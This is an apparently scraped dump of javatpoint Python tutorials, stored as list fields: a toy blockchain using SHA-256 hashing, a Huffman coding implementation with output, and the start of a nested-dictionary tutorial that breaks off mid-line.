beliefs. However, this system is not limited to collecting financial information. Instead, the stored type of data is inconsequential and independent of the Blockchain network.', ""A blockchain is an open-source application that is shared between thousands of computers. These computers follow a set of rules in order to track money that has been sent from accounts tied to the blockchain software. These qualities are mandatory in order to maintain the Blockchain's integrity and the network security within which the transactions occur."", 'Every block is a set of data that says, for instance, ""Tom paid Harry $500 on Tuesday, 14th."" On the Blockchain, we can send the money without using a bank. In order to illustrate the simplicity and elegance of such a system and to describe the nuances, we will understand the process of creating our very own Blockchain using the Python programming language.', ""For the following project, we will only need Python. Also, remember that our Blockchain will be a simplified, high-level introduction. We won't be building an entire Bitcoin blockchain. Instead, we will be creating functions in order to add blocks, transactions, and encryption so that our data is temper-proof."", 'We will start by importing the required libraries. In this case, we will be needing the hashlib library for the encryption, the JSON library for our blocks formatting, and the time library for the timestamp of each block. We will then be creating a class and initializing the following variables:', 'Now, let us include the list of transactions in the program because this whole program is quite pointless without one. So, let us first define a method that returns the block that was added most recently (we will use this in a second for the new index).', 'After that, we will create another method to represent a new transaction. This method will consist of the three most significant variables - the_sender, the_recipient, and the_amount. Without these variables included in every transaction, the users cannot spend, earn, or buy things with the newly produced cryptocurrency. Remember that these transactions are over-simplified and do not reflect the things one may find in a true cryptocurrency.', 'We will include the the_transaction JSON object to the pool of pendingTransactions. These will stay in an indetermination state until a new block is mined and added to the blockchain. And for future reference, we will return the index of the block to which the new transaction is about to be added.', 'In the above snippet of code, we defined the method as lastBlock(), which returns the most recent block added. We have then defined the function as newTransaction(), within which we have defined the JSON object as the_transaction and included the addresses to the sender, recipient, and amount. We added this JSON object to the pendingTransaction and returned the last block.', 'Now, let us add Cryptography to the program. As we know, Bitcoin and many other blockchains utilize SHA-256, an encryption hash function, which accepts some text string (stored as a Unicode value) and spits out a 64-character long encrypted string. In a blockchain, the text that we encrypt is considered a block. For instance, the encrypted string, or ""hash"", of the Bitcoin genesis block appears like this:', 'Blockchains are considered tamper-proof as every block consists of a copy of the previous hash of the block. And as the new hash is derived from the last block, we cannot change any aspect of a block without altering every single hash in front of it.', 'Suppose that someone downloaded the Bitcoin blockchain to their computer and wrote ""Satoshi sends Alex 7,236,000 Bitcoin!"" into the genesis block and broadcasted this to the Bitcoin network and claimed that he is a secret billionaire. However, as soon as any self-respecting miner compares their current copy of the blockchain, especially the hash values stored in each block, with his copy of the chain, they will notice that he is a liar, refusing to validate it and run him off the network.', 'We will define the method that accepts the new block and alter its key/value pairs into strings. We will then convert that string into Unicode, which we will pass into the SHA256 method from the hashlib library and create a hexadecimal string from its return value. We will then return the new hash.', 'In the above snippet of code, we have defined the hash() function and accepts one block and turned them into Strings and then into Unicode for hashing. We have then used the SHA256() function for encryption and then translated the Unicode into a Hexadecimal string.', 'In the above output, we can observe that our blockchain contains three blocks right now: The genesis block (with an index of 1 and no transactions), in addition to the 2 that we added ourselves. We can also notice that the encrypted hashes (derived from every preceding block) and the timestamps do not match each other. Granted, the computer constructed each block almost simultaneously as we executed the program and generated blocks at almost the same time; however, Bitcoin blocks are created approximately every ten minutes.', ""Does anyone of us notice any account balances? Blockchains are not banks, and here is a good example to distinguish between the two. A cryptocurrency wallet will estimate the balance by scanning the complete chain and summing up how many coins we received and spent. We do not have to rely on a bank to tell us the amount present in the account. We are only trusting the network instead of one mega-corporation. Isn't it fascinating?"", 'In the following tutorial, we have successfully built a blockchain that we can fill with blocks full of transactions of cryptocurrency; however, this is not a secure network. First, we created a block any time somebody calls newBlock(), and there are no conditions. The newBlock() method requires a parameter called proof; however, that can be anything in our case. It can either be by a number or string saying, ""hello world"", or literally anything.', 'In the network of Bitcoin, there is a consensus mechanism in a place called Proof of Work, which illustrates the rules by which security is achieved. A proof is a random number that is very difficult to find unless we have some dedicated high-performance machines working around the clock.', 'There are many other details we are missing, such as fees for the miners to collect, a count of the transaction, public/private key, a Merkle tree structure, and more. However, the above walkthrough was helpful for us as a fundamental example of the moving segments in a blockchain.']","['# importing the required libraries', 'import hashlib', 'import json', 'from time import time', '# creating the Block_chain class', 'class Block_chain(object):', 'def __init__(self):', 'self.chain = []', 'self.pendingTransactions = []', 'self.newBlock(previousHash = ""The Times 03/Jan/2009 Chancellor on brink of second bailout for banks."", the_proof = 100)', '# Creating a new block listing key/value pair of', '# block information in a JSON object.', '# Reset the list of pending transactions &', '# append the newest block to the chain.', 'def newBlock(self, the_proof, previousHash = None):', 'the_block = {', ""'index': len(self.chain) + 1,"", ""'timestamp': time(),"", ""'transactions': self.pendingTransactions,"", ""'proof': the_proof,"", ""'previous_hash': previousHash or self.hash(self.chain[-1]),"", '}', 'self.pendingTransactions = []', 'self.chain.append(the_block)', 'return the_block', '#Searching the blockchain for the most recent block.', '@property', 'def lastBlock(self):', 'return self.chain[-1]', ""# Adding a transaction with relevant info to the 'blockpool' - list of pending transactions."", 'def newTransaction(self, the_sender, the_recipient, the_amount):', 'the_transaction = {', ""'sender': the_sender,"", ""'recipient': the_recipient,"", ""'amount': the_amount"", '}', 'self.pendingTransactions.append(the_transaction)', ""return self.lastBlock['index'] + 1"", '# receiving one block. Turning it into a string, turning that into', '# Unicode (for hashing). Hashing with SHA256 encryption,', '# then translating the Unicode into a hexadecimal string.', 'def hash(self, the_block):', 'stringObject = json.dumps(the_block, sort_keys = True)', 'blockString = stringObject.encode()', 'rawHash = hashlib.sha256(blockString)', 'hexHash = rawHash.hexdigest()', 'return hexHash', 'block_chain = Block_chain()', 'transaction1 = block_chain.newTransaction(""Satoshi"", ""Alex"", \'10 BTC\')', 'transaction2 = block_chain.newTransaction(""Alex"", ""Satoshi"", \'2 BTC\')', 'transaction3 = block_chain.newTransaction(""Satoshi"", ""James"", \'10 BTC\')', 'block_chain.newBlock(10123)', 'transaction4 = block_chain.newTransaction(""Alex"", ""Lucy"", \'2 BTC\')', 'transaction5 = block_chain.newTransaction(""Lucy"", ""Justin"", \'1 BTC\')', 'transaction6 = block_chain.newTransaction(""Justin"", ""Alex"", \'1 BTC\')', 'block_chain.newBlock(10384)', 'print(""Genesis block: "", block_chain.chain)', '# importing the required libraries', 'import hashlib', 'import json', 'from time import time', '# creating the Block_chain class', 'class Block_chain(object):', 'def __init__(self):', 'self.chain = []', 'self.pendingTransactions = []', 'self.newBlock(previousHash = ""The Times 03/Jan/2009 Chancellor on brink of second bailout for banks."", the_proof = 100)', '# Creating a new block listing key/value pairs of', '# block information in a JSON object.', '# Reset the list of pending transactions &', '# append the newest block to the chain.', 'def newBlock(self, the_proof, previousHash = None):', 'the_block = {', ""'index': len(self.chain) + 1,"", ""'timestamp': time(),"", ""'transactions': self.pendingTransactions,"", ""'proof': the_proof,"", ""'previous_hash': previousHash or self.hash(self.chain[-1]),"", '}', 'self.pendingTransactions = []', 'self.chain.append(the_block)', 'return the_block', '#Searching the blockchain for the most recent block.', '@property', 'def lastBlock(self):', 'return self.chain[-1]', ""# Adding a transaction with relevant info to the 'blockpool' - list of pending tx's."", 'def newTransaction(self, the_sender, the_recipient, the_amount):', 'the_transaction = {', ""'sender': the_sender,"", ""'recipient': the_recipient,"", ""'amount': the_amount"", '}', 'self.pendingTransactions.append(the_transaction)', ""return self.lastBlock['index'] + 1"", '# receiving one block. Turning it into a string, turning that into', '# Unicode (for hashing). Hashing with SHA256 encryption,', '# then translating the Unicode into a hexidecimal string.', 'def hash(self, the_block):', 'stringObject = json.dumps(the_block, sort_keys = True)', 'blockString = stringObject.encode()', 'rawHash = hashlib.sha256(blockString)', 'hexHash = rawHash.hexdigest()', 'return hexHash', 'block_chain = Block_chain()', 'transaction1 = block_chain.newTransaction(""Satoshi"", ""Alex"", \'10 BTC\')', 'transaction2 = block_chain.newTransaction(""Alex"", ""Satoshi"", \'2 BTC\')', 'transaction3 = block_chain.newTransaction(""Satoshi"", ""James"", \'10 BTC\')', 'block_chain.newBlock(10123)', 'transaction4 = block_chain.newTransaction(""Alex"", ""Lucy"", \'2 BTC\')', 'transaction5 = block_chain.newTransaction(""Lucy"", ""Justin"", \'1 BTC\')', 'transaction6 = block_chain.newTransaction(""Justin"", ""Alex"", \'1 BTC\')', 'block_chain.newBlock(10384)', 'print(""Genesis block: "", block_chain.chain)']","['Genesis block:  [', ""{'index': 1,"", ""'timestamp': 1640067926.584454,"", ""'transactions': [],"", ""'proof': 100,"", ""'previous_hash': 'The Times 03/Jan/2009 Chancellor on brink of second bailout for banks.'},"", '', ""{'index': 2,"", ""'timestamp': 1640067926.584454,"", ""'transactions': ["", ""{'sender': 'Satoshi', 'recipient': 'Alex', 'amount': '10 BTC'},"", ""{'sender': 'Alex', 'recipient': 'Satoshi', 'amount': '2 BTC'},"", ""{'sender': 'Satoshi', 'recipient': 'James', 'amount': '10 BTC'}"", '],', ""'proof': 10123,"", ""'previous_hash': 'a1b0cf063d43989421eb4b28d9be8f82c2e2e9e40bc9814321e3cbb70b00530a'},"", '', ""{'index': 3,"", ""'timestamp': 1640067926.584454,"", ""'transactions': ["", ""{'sender': 'Alex', 'recipient': 'Lucy', 'amount': '2 BTC'},"", ""{'sender': 'Lucy', 'recipient': 'Justin', 'amount': '1 BTC'},"", ""{'sender': 'Justin', 'recipient': 'Alex', 'amount': '1 BTC'}"", '],', ""'proof': 10384,"", ""'previous_hash': '23699917fdcc013a85bbb5872251768e976bfcc2cd8403565c04970bca24a871'}"", ']']",[],"[""|||Immutable|||Distributed|||Persistent (no loss of data)|||Unhackable||||||chain: This will be an empty list to which we will add blocks. Quite literally, the 'blockchain'.|||pendingTransactions: When users send the coins to each other, their transactions will locate in this array until we approve and insert them into a new block.|||newBlock: This is a method that we will define soon, and we will utilize it in order to include each block in the chain.||||||index: Taking the length of the blockchain and adding 1 to it. We will use this to reference an individual block, so for instance, the genesis block has index = 1.|||timestamp: With the help of the time() module, we will stamp the block when it's created. Users can now check when their transaction was confirmed on-chain.|||transactions: Any transactions that have been in the 'pending' list will be displayed in the new block.|||proof: This property comes from the miner who thinks they found a valid 'proof' or 'nonce'.|||previous_hash: A hashed version of the most recent approved block.|||""]"
420,['Huffman Coding using Python'],"['Huffman coding is a lossless method for compressing and encoding text based on the frequency of the characters in the text. In information theory and computer science studies, Huffman code is a special type of optimal prefix code that is generally utilized for lossless data compression.']","['https://www.javatpoint.com/nested-dictionary-in-python', 'https://www.javatpoint.com/building-a-blockchain-using-python', 'https://www.javatpoint.com/nested-dictionary-in-python', 'https://www.javatpoint.com/building-a-blockchain-using-python', 'https://www.javatpoint.com/nested-dictionary-in-python']",['https://static.javatpoint.com/python/images/huffman-coding-using-python.png'],[],"['Understanding the Huffman Coding', 'Understanding the Theory of Huffman Coding', 'Huffman Code Implementation using Python']",[],[],"['Let us now understand the theory of Huffman coding.', 'The optimal tree upon completion is shown in the following table and image:', 'Let us now develop and implement a program that utilizes Huffman coding in the following section.', 'Let us consider the following snippet of code demonstrating the same:', 'Explanation:', 'Explanation:', 'Let us consider the following snippet of code demonstrating the same:', 'Explanation:', 'Let us understand the same using the following snippet of code:', 'Explanation:', 'Let us consider the following snippet of code demonstrating the process of decoding Huffman Encoded data.', 'Explanation:', 'Now, let us initialize the string data and print the results.', 'Explanation:', 'Let us now see the complete project before its execution.', 'The Complete Project Code', 'Let us see the complete Python project code of the Huffman coding.', 'File: huffmanAlgo.py']","['In the following tutorial, we will be going to understand the theory of Huffman Coding along with its implementation using the Python programming language. But we get to that; let us understand the Huffman Coding in brief.', 'A letter or a symbol that occurs often is exemplified using a shorter code, and a letter or symbol that occurs infrequently is exemplified using a longer code.', 'This thought leads to an efficient depiction of characters that need less memory to be stored. Hence, we can conclude that we can use Huffman coding as a data compression method.', 'In the above snippet of code, we have defined three different helper functions in order to calculate probabilities of the symbols in the given data, obtain the encoding of symbols, and obtain the result.', 'We will use the HuffmanEncoding function, which accepts only the data as an argument and returns the resulting encoding and the total gain using all the above-described functions.', 'Now, we will define a function in order to decode Huffman Encoded data for obtaining the initial, uncompressed data again which is quite a simple process.']","['Huffman Coding is a Lossless Compression Algorithm that is utilized for data compression. It is an algorithm developed by David A. Huffman while he was an Sc.D. Student at Massachusetts Institute of Technology (MIT) published in the year 1952 paper ""A Method for the Construction of Minimum-Redundancy Codes"". It was a part of his research into Computer Programming and is generally found in programming languages like C, C++, Python, Java, JavaScript, Ruby, and many more. The thought process behind Huffman encoding is as follows:', 'We know that a file is stored on a computer as binary code and that each character in the file has been assigned a binary character, and the character codes generally have a fixed length for distinct characters. Huffman coding is established on the frequency with which each character in the file appears and the number of characters in a data structure with a frequency of zero (0). The Huffman encoding for a typical text file saves around 40 percent of the size of the actual data. Huffman binary code, like compiled executables, would thus have a distinct space-saving. A binary file in which an ASCII character is encoded with a frequency of 0.5 would have a very different frequency and distribution from its ASCII equivalent.', 'In order to compress a file using a sequence of characters, we require a table that provides us with the sequences of bits utilized for each character. This table generates an encoding tree that utilizes the root/leaf path in order to create a bit sequence that encodes the characters. We can follow the roots and leaves to create a list of characters with the maximum bit length of the encoded characters and the number of occurrences.', 'We can use a greedy algorithm in order to construct an optimal tree. Huffman encoding trees return the minimum length character encodings utilized in compressing the data. The nodes in the tree depict the frequency of the occurrence of the character. The root node depicts the length of the string, and traversing the tree provides us with the encodings specified to the character. Once the tree is constructed, traversing the tree provides us with the respective codes of each symbol.', 'We will start by creating a class as Nodes, referred to as the nodes of the Binary Huffman Tree. Essentially, each node consists of a symbol and associated probability variable, left and right child, and code variable. Code variable will either be 0 or 1 depending on the side we choose (left for 0 and right for 1) while traveling through the Huffman Tree.', 'In the above snippet of code, we have defined a class as Nodes and initialized some parameters as probability, symbol, left, and right. We have initially set the values of the left and right variables as None as the direction is not defined yet. At last, we have also initialized the code variable.', 'Now, we will add some supporting functions. The first function is to calculate the probabilities of the symbols in the provided data. The second function is to obtain encodings of symbols that we will use once we have the Huffman Tree. The last function is to obtain the result (encoded data).', 'For the first function, we have defined a dictionary as the_symbols and iterate through the items in the given data using the for-loop and insert them into the dictionary. We have also used the if-else conditional statement to check if the data contains some element or not and perform the operation accordingly.', 'For the second function, we have defined another dictionary as the_codes. Within the function, we have assigned a variable storing the Huffman code for the current node and used the if conditional statements to add the nodes at the left and right with the current node and return the symbols encoding.', 'For the last function, we have created an empty array. We have then used the for-loop iterating through the characters in the data and append() function to add data to the array. We have then used the join() function to join the elements from the array to the string and returned the string.', 'Moreover, we will also define another function as TotalGain, which accepts the initial data and the dictionary coming from CalculateCode, holding the symbols and their codes together. That function will help us calculate the difference between the size of a bit of compressed and non-compressed data.', 'In the above snippet of code, we have defined the function. We calculated the total bit space to store the data before compression. We have then defined a variable to store the bit space size after data compression and assigned it to zero. We have then iterated through the keys from the dictionary from the CalculateCode function and counted their occurrences. We have then calculated the bit space that requires to store the data after compression.', 'In the above snippet of code, we used the data argument, calculated the probability of symbols using the CalculateProbability function, and stored the resulting data in a variable. We have then extracted the symbols (keys) and probabilities (values) and printed them for the users. We have then defined an array as the_nodes and converted the symbols and probabilities into the nodes of the Huffman tree. We have used the for-loop iterating through the symbols and appending them to the array. We have also used the while loop in order to sort the nodes in ascending order based on their probabilities. We selected the two smallest nodes and combined them to create a new node. We removed the smallest nodes from the array and added the new node to it. We have then used the CalculateCodes function to calculate the code for the Huffman encoding and print the symbols with codes for the users. We have also used the TotalGain function, providing the required parameters to calculate the difference between the bit space of compressed and non-compressed data. At last, we have printed the result and returned the encodedOutput and the zeroth index of the array.', 'In the above snippet of code, we have defined a function as HuffmanDecoding that accepts two parameters as encodedData and huffmanTree. We have then assigned the huffmanTree variable to another variable. We have also defined an empty array as decodedOutput. We have then used the for-loop to iterate through the elements in the encoded data. Within the loop, we have used the if-elif-else conditional statement and try-exception method in order to decode the encoded data and append each decoded element to generate a decoded output. At last, we have created a string and returned the string for the users.', 'In the above snippet of code, we have defined string data and printed it for the users. We passed this data to the HuffmanEncoding function and stored the values in encoding and the_tree variables. We have then printed the Encoded result for the users. At last, we have passed the encoded data to the HuffmanDecoding function and printed the decoded string.']","['# Node of a Huffman Tree', 'class Nodes:', 'def __init__(self, probability, symbol, left = None, right = None):', '# probability of the symbol', 'self.probability = probability', '# the symbol', 'self.symbol = symbol', '# the left node', 'self.left = left', '# the right node', 'self.right = right', '# the tree direction (0 or 1)', ""self.code = ''"", '"""""" A supporting function in order to calculate the probabilities of symbols in specified data """"""', 'def CalculateProbability(the_data):', 'the_symbols = dict()', 'for item in the_data:', 'if the_symbols.get(item) == None:', 'the_symbols[item] = 1', 'else:', 'the_symbols[item] += 1', 'return the_symbols', '"""""" A supporting function in order to print the codes of symbols by travelling a Huffman Tree """"""', 'the_codes = dict()', ""def CalculateCodes(node, value = ''):"", '# a huffman code for current node', 'newValue = value + str(node.code)', 'if(node.left):', 'CalculateCodes(node.left, newValue)', 'if(node.right):', 'CalculateCodes(node.right, newValue)', 'if(not node.left and not node.right):', 'the_codes[node.symbol] = newValue', '', 'return the_codes', '"""""" A supporting function in order to get the encoded result """"""', 'def OutputEncoded(the_data, coding):', 'encodingOutput = []', 'for element in the_data:', ""print(coding[element], end = '')"", 'encodingOutput.append(coding[element])', '', ""the_string = ''.join([str(item) for item in encodingOutput])"", 'return the_string', '"""""" A supporting function in order to calculate the space difference between compressed and non compressed data""""""', 'def TotalGain(the_data, coding):', '# total bit space to store the data before compression', 'beforeCompression = len(the_data) * 8', 'afterCompression = 0', 'the_symbols = coding.keys()', 'for symbol in the_symbols:', 'the_count = the_data.count(symbol)', '# calculating how many bit is required for that symbol in total', 'afterCompression += the_count * len(coding[symbol])', 'print(""Space usage before compression (in bits):"", beforeCompression)', 'print(""Space usage after compression (in bits):"",  afterCompression)', 'def HuffmanEncoding(the_data):', 'symbolWithProbs = CalculateProbability(the_data)', 'the_symbols = symbolWithProbs.keys()', 'the_probabilities = symbolWithProbs.values()', 'print(""symbols: "", the_symbols)', 'print(""probabilities: "", the_probabilities)', 'the_nodes = []', '# converting symbols and probabilities into huffman tree nodes', 'for symbol in the_symbols:', 'the_nodes.append(Nodes(symbolWithProbs.get(symbol), symbol))', 'while len(the_nodes) > 1:', '# sorting all the nodes in ascending order based on their probability', 'the_nodes = sorted(the_nodes, key = lambda x: x.probability)', '# for node in nodes:', '#      print(node.symbol, node.prob)', '# picking two smallest nodes', 'right = the_nodes[0]', 'left = the_nodes[1]', 'left.code = 0', 'right.code = 1', '# combining the 2 smallest nodes to create new node', 'newNode = Nodes(left.probability + right.probability, left.symbol + right.symbol, left, right)', 'the_nodes.remove(left)', 'the_nodes.remove(right)', 'the_nodes.append(newNode)', '', 'huffmanEncoding = CalculateCodes(the_nodes[0])', 'print(""symbols with codes"", huffmanEncoding)', 'TotalGain(the_data, huffmanEncoding)', 'encoded_output = OutputEncoded(the_data,huffmanEncoding)', 'return encoded_output, the_nodes[0]', 'def HuffmanDecoding(encodedData, huffmanTree):', 'treeHead = huffmanTree', 'decodedOutput = []', 'for x in encodedData:', ""if x == '1':"", 'huffmanTree = huffmanTree.right', ""elif x == '0':"", 'huffmanTree = huffmanTree.left', 'try:', 'if huffmanTree.left.symbol == None and huffmanTree.right.symbol == None:', 'pass', 'except AttributeError:', 'decodedOutput.append(huffmanTree.symbol)', 'huffmanTree = treeHead', '', ""string = ''.join([str(item) for item in decodedOutput])"", 'return string', 'the_data = ""AAAAAAABBCCCCCCDDDEEEEEEEEE""', 'print(the_data)', 'encoding, the_tree = HuffmanEncoding(the_data)', 'print(""Encoded output"", encoding)', 'print(""Decoded Output"", HuffmanDecoding(encoding, the_tree))', '# Node of a Huffman Tree', 'class Nodes:', 'def __init__(self, probability, symbol, left = None, right = None):', '# probability of the symbol', 'self.probability = probability', '# the symbol', 'self.symbol = symbol', '# the left node', 'self.left = left', '# the right node', 'self.right = right', '# the tree direction (0 or 1)', ""self.code = ''"", '"""""" A supporting function in order to calculate the probabilities of symbols in specified data """"""', 'def CalculateProbability(the_data):', 'the_symbols = dict()', 'for item in the_data:', 'if the_symbols.get(item) == None:', 'the_symbols[item] = 1', 'else:', 'the_symbols[item] += 1', 'return the_symbols', '"""""" A supporting function in order to print the codes of symbols by travelling a Huffman Tree """"""', 'the_codes = dict()', ""def CalculateCodes(node, value = ''):"", '# a huffman code for current node', 'newValue = value + str(node.code)', 'if(node.left):', 'CalculateCodes(node.left, newValue)', 'if(node.right):', 'CalculateCodes(node.right, newValue)', 'if(not node.left and not node.right):', 'the_codes[node.symbol] = newValue', '', 'return the_codes', '"""""" A supporting function in order to get the encoded result """"""', 'def OutputEncoded(the_data, coding):', 'encodingOutput = []', 'for element in the_data:', ""# print(coding[element], end = '')"", 'encodingOutput.append(coding[element])', '', ""the_string = ''.join([str(item) for item in encodingOutput])"", 'return the_string', '', '"""""" A supporting function in order to calculate the space difference between compressed and non compressed data""""""', 'def TotalGain(the_data, coding):', '# total bit space to store the data before compression', 'beforeCompression = len(the_data) * 8', 'afterCompression = 0', 'the_symbols = coding.keys()', 'for symbol in the_symbols:', 'the_count = the_data.count(symbol)', '# calculating how many bit is required for that symbol in total', 'afterCompression += the_count * len(coding[symbol])', 'print(""Space usage before compression (in bits):"", beforeCompression)', 'print(""Space usage after compression (in bits):"",  afterCompression)', 'def HuffmanEncoding(the_data):', 'symbolWithProbs = CalculateProbability(the_data)', 'the_symbols = symbolWithProbs.keys()', 'the_probabilities = symbolWithProbs.values()', 'print(""symbols: "", the_symbols)', 'print(""probabilities: "", the_probabilities)', 'the_nodes = []', '# converting symbols and probabilities into huffman tree nodes', 'for symbol in the_symbols:', 'the_nodes.append(Nodes(symbolWithProbs.get(symbol), symbol))', 'while len(the_nodes) > 1:', '# sorting all the nodes in ascending order based on their probability', 'the_nodes = sorted(the_nodes, key = lambda x: x.probability)', '# for node in nodes:', '#      print(node.symbol, node.prob)', '# picking two smallest nodes', 'right = the_nodes[0]', 'left = the_nodes[1]', 'left.code = 0', 'right.code = 1', '# combining the 2 smallest nodes to create new node', 'newNode = Nodes(left.probability + right.probability, left.symbol + right.symbol, left, right)', 'the_nodes.remove(left)', 'the_nodes.remove(right)', 'the_nodes.append(newNode)', '', 'huffmanEncoding = CalculateCodes(the_nodes[0])', 'print(""symbols with codes"", huffmanEncoding)', 'TotalGain(the_data, huffmanEncoding)', 'encodedOutput = OutputEncoded(the_data,huffmanEncoding)', 'return encodedOutput, the_nodes[0]', 'def HuffmanDecoding(encodedData, huffmanTree):', 'treeHead = huffmanTree', 'decodedOutput = []', 'for x in encodedData:', ""if x == '1':"", 'huffmanTree = huffmanTree.right', ""elif x == '0':"", 'huffmanTree = huffmanTree.left', 'try:', 'if huffmanTree.left.symbol == None and huffmanTree.right.symbol == None:', 'pass', 'except AttributeError:', 'decodedOutput.append(huffmanTree.symbol)', 'huffmanTree = treeHead', '', ""string = ''.join([str(item) for item in decodedOutput])"", 'return string', 'the_data = ""AAAAAAABBCCCCCCDDDEEEEEEEEE""', 'print(the_data)', 'encoding, the_tree = HuffmanEncoding(the_data)', 'print(""Encoded output"", encoding)', 'print(""Decoded Output"", HuffmanDecoding(encoding, the_tree))']","['AAAAAAABBCCCCCCDDDEEEEEEEEE', ""symbols:  dict_keys(['A', 'B', 'C', 'D', 'E'])"", 'probabilities:  dict_values([7, 2, 6, 3, 9])', ""symbols with codes {'E': '00', 'A': '01', 'C': '10', 'D': '110', 'B': '111'}"", 'Space usage before compression (in bits): 216', 'Space usage after compression (in bits): 59', 'Encoded output 01010101010101111111101010101010110110110000000000000000000', 'Decoded Output AAAAAAABBCCCCCCDDDEEEEEEEEE']",['Character|||a|||b|||d|||e|||f|||h|||i|||k|||n|||o|||r|||s|||t|||u|||v&&&Frequency|||9|||5|||1|||3|||7|||3|||1|||1|||1|||4|||1|||5|||1|||2|||1|||1'],[]
421,['Nested Dictionary in Python'],"['In the Python programming language, we have the concept of dictionaries. The dictionaries are mutable, and we can easily add and delete the items from the dictionary. It is a collection of unordered data items.']","['https://www.javatpoint.com/collections-userstring-in-python', 'https://www.javatpoint.com/huffman-coding-using-python', 'https://www.javatpoint.com/collections-userstring-in-python', 'https://www.javatpoint.com/huffman-coding-using-python', 'https://www.javatpoint.com/collections-userstring-in-python']",[],[],[],['Examples of Nested Dictionary'],[],"['Syntax of Nested dictionary for adding the various dictionaries into a particular one:', 'Let us understand with the help of some examples:', 'Example 1:', 'Explanation:', 'The Output of the following Program', 'Example 2:', 'Explanation:', 'The Output of the following Program', 'Example 3:', 'Explanation:', 'The Output of the following Program', 'Example 4:', 'Explanation:', 'The Output of the following Program', 'Example 5:', 'Explanation:', 'We have created a dictionary containing the data items in the form of pairs. We have created a list of paired items and made them a dictionary.', 'The Output of the following Program', 'Example 6:', 'Explanation:', 'The Output of the following Program', 'Example 7:', 'Explanation:', 'The Output of the following Program', 'Example 8:', 'Explanation:', 'The Output of the following Program', 'Example 9:', 'Explanation:', 'The Output of the following Program', 'Example 10:', 'Explanation:', 'The Output of the following Program', 'Let us take a fix example and then see some variations in it, so that we can easily understand it easily:', 'Example 11:', 'Explanation:', 'Here we have created a simple nested dictionary; further, we will make some changes.', 'The Output of the following Program', 'Example 12:', 'Explanation:', 'The Output of the following Program', 'Example 13:', 'Explanation:', 'The Output of the following Program', 'Example 14:', 'Explanation:', 'The Output of the following Program', 'Example 15:', 'Explanation:', 'The Output of the following Program']","['We have created a dictionary that does not contain any of the keys with the corresponding values. Further, we will perform the nested operation inside this dictionary.', 'We have created a nested dictionary, which contains the empty data set, or an empty dictionary that does not contain any data item with their corresponding key values.', 'In the above example, we have created a nested dictionary that contains the key values with the corresponding values, here we have used the concept of the same keys, in which keys are the same, but the corresponding data values are different.', ""Now for deleting the particular element, let say the id of student 3 from the nested dictionary; we have to use the ' del ' keyword in it; by using it, we can easily delete the particular value that we want."", ""For deleting the particular dictionary inside the nested dictionary, we have used the ' del ' keyword and deleted the whole dictionary of student 3 from the student nested dictionary.""]","[""Adding elements to a nested Dictionary can be done in multiple ways. One way to add a dictionary in the Nested dictionary is to add values one be one, Nesteddict[dict][key] = 'value'. Another way is to add the whole dictionary in one go, Nesteddict[dict] = { 'key': 'value'}."", ""In the above example, we created a dictionary containing the integer key values with the corresponding string values. Here we have symbolized with the student's data in the class having roll number with the corresponding name of each student. Further, we will perform the nested operation inside this dictionary."", ""In the above example, we created a dictionary containing the string key values and corresponding integer values. Here we have symbolized with the student's data in the class having Grade with the corresponding roll number of each student. Further, we will perform the nested operation inside this dictionary."", 'We have created three separate dictionaries and assigned the elements at the corresponding key values one by one. This dictionary contains the integer key values with the corresponding string values. Still, we have created it separately, and after that, we have added these dictionaries. Thus, we can perform the addition operation in the dictionary. We will also perform the nested operation inside this dictionary.', 'We have created a dictionary, which contains the integer key values with the corresponding string values. Here, we have performed the update and the adding operation in the dictionary. We have also made some changes in it and converted it into a nested dictionary.', 'We have created a nested dictionary that contains the key values with the corresponding values. Here, we have used the concept of mixed keys, in which keys are not the same. We will extend it and make a nested dictionary with the same keys but different values.', 'We have created a nested dictionary that contains the integer key values with the corresponding string values. Here, we have first printed the nested dictionary and an empty nested dictionary. We have made some changes and placed the nested dictionary inside the empty dictionary. We have also added the two nested dictionaries.', 'Here we have created a nested dictionary and use the [ ] syntax to access the elements from the dictionary, here it is used when we supply the name of the dictionary than in this [ ] square brackets position of the element you want to fetch, and after than in additional [ ] square brackets supply the attribute or the key value that you want to fetch for the particular element.', 'Here we have created a nested dictionary, and we want to add more elements to that dictionary. It is all done by using [ ] square brackets syntax, firstly we have created an empty set at position 3 in the dictionary, after than one by one we have filled the data into it, here it is used when we supply the name of the dictionary then in this [ ] square brackets position of the element you want to add and after than in additional [ ] square brackets supply the attribute or the key value that you want to assign for the particular element using the equals to sign.', 'Here we have created a nested dictionary, and we want to add more elements to that dictionary. It is all done by using [ ] square brackets syntax. At first, we have created an empty set at position 3 in the dictionary, after that one by one we have filled the data into it.', 'Here, it is used when we supply the name of the dictionary then in this [ ] square brackets position of the element you want to add and after than in additional [ ] square brackets supply the attribute or the key value that you want to assign for the particular element using the equals to sign.', 'Here we have created a nested dictionary, and we want to add more elements to that dictionary. It is all done by using [ ] square brackets syntax. At first, we have created an empty set at position 3 in the dictionary, after that one by one we have filled the data into it, here it is used when we supply the name of the dictionary then in this [ ] square brackets position of the element you want to add and after than in additional [ ] square brackets supply the attribute or the key value that you want to assign for the particular element using the equals to sign.']","['# Let us first create a normal dictionary that contains data items with their', '# corresponding key-value pairs in a python programming language.', '# It contains an integer key with the corresponding string values', ""dict = {1: 'Rina', 2: 'Gita', 3: 'Sita'}"", 'print(""\\n Printing the dictionary that contains integer keys with their corresponding values"")', 'print(dict)', '# In the example we will create a simple empty dictionary using python', '# programming language', 'dict = {}', 'print(""Simple empty Dictionary: "")', 'print(dict)', '# Python program to print Empty nested dictionary', ""dict = { 'dict1': { },                              # Nested dictionary syntax"", ""'dict2': { }, 'dict3': { }}"", 'print(""Nested dictionary are as follows -"")', 'print(dict)', '# Let us first create a normal dictionary that contains data items with their', '# corresponding key value pairs in python programming language.', '# It contains string key with the corresponding key values', ""dict = {'A': 1, 'B': 2, 'C': 3, 'D':4, 'E':5}"", 'print(""\\n Printing the dictionary that contains string keys with their corresponding integer values"")', 'print(dict)', '# Let us first create a normal dictionary that contains data items with their', '# corresponding key-value pairs in a python programming language.', '# Here, each item has formed a pair', ""Dict = dict([(1, 'silk'), (2, 'one')])"", 'print(""\\nDictionary with each item as a pair: "")', 'print(Dict)', '# Let us first create a dictionary that contains data items with their corresponding', '# key value pairs, and here we would assign the values to the keys separately in', '# python programming language.', 'Dict={}', ""Dict[1] = 'Java'"", ""Dict[2] = 'Tpoint'"", 'Dict[3] = 1', 'print(""\\nDictionary after adding 3 elements: "")', 'print(Dict)', '# Let us first create a dictionary that contains data items with their corresponding', '# key value pairs in a python programming language.', '# Here, we would perform the addition and update operation in the nested dictionary', '# to a single Key', ""Dict['Value'] = 